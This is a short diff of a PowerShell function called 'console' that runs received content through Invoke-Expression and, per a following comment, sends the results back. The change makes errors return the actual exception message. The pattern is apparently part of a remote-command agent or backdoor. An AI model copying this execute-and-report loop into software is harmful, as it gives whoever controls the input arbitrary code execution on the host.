@@ -142,7 +142,7 @@ function console{
                     try {
                         $results = $content | iex
                     } catch {
-                        $results = "Error executing the command"
+                        $results = $_.Exception.Message
                     }
 
                     #Send results
